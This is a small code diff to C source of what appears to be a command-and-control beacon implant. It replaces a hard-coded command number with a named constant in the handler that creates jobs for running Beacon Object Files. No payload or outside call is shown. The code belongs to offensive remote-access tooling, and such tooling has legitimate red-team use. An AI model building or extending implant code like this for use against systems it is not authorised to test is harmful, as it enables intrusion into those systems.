@@ -1,3 +1,4 @@
+#include "beacon_commands.h"
 #include "beacon_bof_internal.h"
 
 /*
@@ -209,7 +210,7 @@ PacketList CommandBofHandle(BeaconContext* ctx, UINT32 task_id, Parser* p)
     }
 
     /* 创建 Job */
-    job = JobCreate(ctx, task_id, 70u, JOB_TYPE_BOF, "bof");
+    job = JobCreate(ctx, task_id, BEACON_COMMAND_BOF, JOB_TYPE_BOF, "bof");
     if (!job) {
         RuntimeActivityEnd(ctx);
         PlistAdd(&out, BbFromText("BOF: failed to create job"));
